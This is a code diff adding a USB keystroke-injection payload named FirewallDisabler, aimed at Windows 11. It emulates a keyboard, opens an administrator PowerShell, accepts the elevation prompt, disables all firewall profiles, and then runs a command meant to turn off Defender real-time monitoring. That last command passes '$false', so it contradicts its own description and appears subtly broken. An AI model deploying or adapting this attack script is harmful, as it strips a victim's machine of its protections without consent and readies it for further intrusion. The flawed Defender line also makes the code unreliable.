@@ -1,0 +1,34 @@
+# Title: FirewallDisabler
+# Description: This payload helps you disable firewall and realtime monitoring completely via powershell
+# Author: Gopalsamy Rajendran
+# Target: Windows 11 - Latest
+# Version 1.0
+# Dependencies: The current logged-in user must be an admin user. Make sure to adjust DELAY timing based on your needs. 
+
+#Attack
+LED ATTACK
+ATTACKMODE HID STORAGE
+
+#Opens Powershell as admin user
+Q GUI
+Q DELAY 1000
+Q STRING powershell
+Q DELAY 1000
+Q CTRL-SHIFT ENTER
+Q DELAY 2000
+Q LEFTARROW
+Q DELAY 2000
+Q ENTER
+
+#Disable firewall and realtime monitoring
+Q DELAY 2000
+Q STRING "Set-NetFirewallProfile -Enabled False"
+Q ENTER
+Q DELAY 2000
+Q STRING "Set-MpPreference -DisableRealtimeMonitoring \$false"
+Q ENTER
+Q DELAY 5000
+Q STRING "exit"
+Q ENTER
+
+LED FINISH
